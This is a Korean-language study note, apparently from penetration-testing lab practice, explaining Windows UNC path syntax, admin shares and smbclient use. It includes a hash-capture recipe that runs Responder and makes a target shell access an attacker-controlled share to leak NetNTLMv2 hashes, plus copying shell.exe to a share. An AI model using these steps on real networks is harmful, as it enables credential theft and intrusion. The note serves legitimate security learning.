# UNC (Universal Naming Convention)

Windows에서 네트워크 공유 리소스(폴더, 프린터 등)에 접근할 때 쓰는 경로 표기법이다. 로컬 경로(`C:\...`)와 구분되는 네트워크 경로다.

## 1. 형식

```
\\서버주소\공유이름
```

- `\\` = 네트워크 경로 표시 (백슬래시 2개)
- `서버주소` = IP 주소 또는 호스트명
- `공유이름` = 공유 폴더 이름

구조 분해:

```
\\  192.168.1.10  \  share
│      │            │    │
│      │            │    └─ ③ 공유 폴더 이름
│      │            └─ 구분자
│      └─ ② 서버 주소 (IP 또는 컴퓨터 이름)
└─ ① "네트워크 경로" 표시
```

## 2. Windows vs Linux 표기

OS와 무관하게 smbclient는 항상 `//`를 사용한다. Windows 네이티브 명령(`dir`, `cd`)은 `\\`를 사용한다.

- Windows (cmd/PowerShell): `\\` → `\\192.168.1.10\share`
- Linux (smbclient): `//` → `//192.168.1.10/share`

Windows에서는 같은 의미를 백슬래시 2개로 쓴다. 서버 OS(Linux/Windows)와 무관하다.

## 3. 왜 중요한가 (해시 캡처)

Windows는 네트워크 공유에 접근할 때 자동으로 현재 로그인 유저의 인증 정보를 보낸다. 이건 Windows의 설계 동작이다.

mike 셸에서 `dir \\192.168.45.156\share`를 실행하면:

1. Windows: "mike로서 192.168.45.156의 share 폴더에 접근하겠다"
2. 공격자 머신의 Responder(가짜 SMB 서버)가 응답
3. Windows가 mike의 NetNTLMv2 해시를 공격자에게 자동 전송
4. Responder가 그 해시를 캡처

UNC 경로 접근 = Windows가 자동으로 내 인증 정보를 상대방에게 보냄. 이걸 이용해서 해시를 낚아채는 것.

로컬 경로(`C:\...`)는 인증이 필요 없지만, UNC 경로(`\\...`)는 네트워크 자원이므로 Windows가 인증 절차를 밟는다.

## 4. 자주 쓰는 UNC 경로

```text
\\192.168.1.10\share          # 일반 공유 폴더
\\192.168.1.10\C$              # C 드라이브 관리자 공유 (admin 권한 필요)
\\192.168.1.10\ADMIN$          # Windows 디렉토리 관리자 공유
\\192.168.1.10\IPC$            # IPC 파이프 (named pipe, 인증용)
\\monster.pg\share             # 호스트명으로 접근
```

관리자 공유(`C$`, `ADMIN$`, `IPC$`)는 끝에 `$`가 붙는다. 숨겨진 공유를 의미한다.

## 5. 실전 사용 예시

### 5.1 Responder로 NetNTLMv2 해시 캡처

공격자 머신에서 Responder 실행:

```bash
sudo python3 Responder.py -I tun0
```

타겟 셸(Windows)에서 UNC 경로 접근:

```powershell
dir \\192.168.45.156\share
```

Responder 창에 NetNTLMv2 해시가 캡처된다.

### 5.2 smbclient로 UNC 경로 접근 (Linux)

```bash
# 공유 목록 확인
smbclient -L //192.168.1.10 -N

# 공유 접속
smbclient //192.168.1.10/share -N
```

### 5.3 Windows에서 UNC 경로로 파일 복사

```powershell
# 원격 공유에서 파일 복사
copy \\192.168.1.10\share\file.txt C:\temp\

# 원격 공유로 파일 전송
copy C:\temp\shell.exe \\192.168.1.10\share\
```

### 5.4 UNC 경로에 인증 정보 포함

```powershell
# 자격 증명 지정 (net use)
net use \\192.168.1.10\share /user:admin Password123

# 연결 해제
net use \\192.168.1.10\share /delete
```

## 6. 주의사항

- UNC 경로 접근 시 Windows가 자동 인증을 시도하므로, 공격자 머신에 Responder나 가짜 SMB 서버가 떠 있으면 해시가 유출된다.
- 방화벽이나 SMB 서명(SMB Signing)이 활성화된 환경에서는 포이즈닝이 실패할 수 있다.
- `IPC$` 공유는 인증 채널로 사용되며, LLMNR/NBT-NS 포이즈닝과 결합해 해시를 캡처한다.

## 7. 관련 도구

- Responder: LLMNR/NBT-NS/MDNS 포이즈닝으로 NetNTLMv2 해시 캡처
- smbclient: Linux에서 SMB 공유 접근
- impacket-smbclient: Python 기반 SMB 클라이언트
- crackmapexec: SMB 인증 테스트 및 명령 실행
